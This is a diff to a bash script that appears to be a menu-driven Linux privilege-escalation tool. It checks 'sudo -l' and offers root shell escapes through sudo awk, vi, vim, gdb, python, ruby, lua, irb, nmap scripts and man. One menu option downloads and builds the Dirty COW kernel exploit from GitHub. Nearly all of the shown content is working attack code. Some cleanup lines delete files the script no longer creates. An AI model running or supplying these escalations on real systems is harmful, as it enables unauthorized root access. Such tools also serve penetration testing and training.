@@ -68,7 +68,7 @@ cat << "img"
                      
 img
 echo -e "\e[1;94m=======================================================================\e[m"
-echo -e "\e[1;46m Possible options (‡ excluded):\e[m \e[1;91m"
+echo -e "\e[1;46m Possible exploitable options (‡ excluded):\e[m \e[1;91m"
 # Check if possible
 sudo -l > check.txt
 # Value check
@@ -133,7 +133,7 @@ echo
 echo -e "\e[1;92m Select From the menu:"
 echo 
 echo "   1) Find                8) Man  *               17) Pathzuzu °‡"
-echo "   2) AWK                10) Dirty COW °‡          18) History °‡"
+echo "   2) AWK                10) Dirtyc0w °‡          18) History °‡"
 echo "   3) Nmap               11) Gdb                  19) Vim"
 echo "   4) Vi                 12) Ruby                 20) Lua"
 echo "   5) Python             13) b3                   21) Ftp *"
@@ -142,8 +142,7 @@ echo "   7) Less *             15) Tee                  23) Update"
 echo "   8) More *             16) VSP °‡               99) Exit"
 echo -e "\e[m"
 echo " VSP = Vulnerable Script Permissions"
-echo " Pathzuzu = SUID exploitation through Path vulnerability"
-echo " b3 = editable root privileged commands listed in 'sudo -l'"
+echo " Pathzuzu = SUID exploitation threw Path vulnerability"
 echo -e "\e[1;93m * user interaction \e[m"
 echo -e "\e[1;93m ° sudo not required \e[m"
 read -p " Enter Number: " number
@@ -158,22 +157,22 @@ elif [ $number = 2 ]; then
 	sudo awk 'BEGIN {system("/bin/bash")}'
 # NMAP
 elif [ $number = 3 ]; then
-	echo "os.execute('/bin/bash')" > x.nse
-	sudo nmap –script=x.nse
-	rm x.nse
+	echo "os.execute('/bin/sh')" > /tmp/yodoNmap.nse
+	sudo nmap -script=/tmp/yodoNmap.nse
+	rm /tmp/yodoNmap.nse
 # VI
 elif [ $number = 4 ]; then
 	sudo vi -c ':shell'
 # PYTHON
 elif [ $number = 5 ]; then
-	echo "import os" >> python
-	echo "os.system('/bin/bash')" >> python
-	sudo python python
+	echo "import os" >> /tmp/yodoPython
+	echo "os.system('/bin/bash')" >> /tmp/yodoPython
+	sudo python /tmp/yodoPython
 	rm python
 # IRB
 elif [ $number = 6 ]; then
-	echo "exec '/bin/bash'" > irb.rb
-	sudo irb -r ./irb.rb
+	echo "exec '/bin/bash'" > /tmp/yodoIrb.rb
+	sudo irb -r /tmp/yodoIrb.rb
 	rm irb.rb
 # LESS
 elif [ $number = 7 ]; then	
@@ -195,7 +194,7 @@ elif [ $number = 9 ]; then
 	echo 'when the MAN page appears, please type "!bash" (without quotes) and press Enter'
 	read -p "Press Enter to continue..."
 	sudo man man
-# DIRTY COW
+# DIRTYC0W
 elif [ $number = 10 ]; then
 	clear
 	wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c
@@ -213,14 +212,14 @@ elif [ $number = 10 ]; then
 	sudo -S -u yodo find . -exec bash -i \;
 # GDB
 elif [ $number = 11 ]; then
-	echo '!/bin/bash' > gdb
-	sudo gdb -batch -x gdb
-	rm gdb
+	echo '!/bin/bash' > /tmp/yodoGdb
+	sudo gdb -batch -x /tmp/yodoGdb
+	rm /tmp/yodoGdb
 # RUBY
 elif [ $number = 12 ]; then
-	echo "exec '/bin/bash';" > rb.rb
-	sudo ruby rb.rb
-	rm rb.rb
+	echo "exec '/bin/bash';" > /tmp/yodoRuby.rb
+	sudo ruby /tmp/yodoRuby.rb
+	rm /tmp/yodoRuby.rb
 # B3
 elif [ $number = 13 ]; then	
 	a=$(sudo -l | grep NOPASSWD | head -n 1 | cut -d ":" -f2)
@@ -357,8 +356,8 @@ elif [ $number = 19 ]; then
 	sudo vim -c ':shell'
 # LUA 
 elif [ $number = 20 ]; then
-	echo "os.execute('/bin/bash')" > lua
-	sudo lua lua
+	echo "os.execute('/bin/bash')" > /tmp/yodoLua
+	sudo lua /tmp/yodoLua
 # FTP
 elif [ $number = 21 ]; then
 	echo "I need you to help me here!"
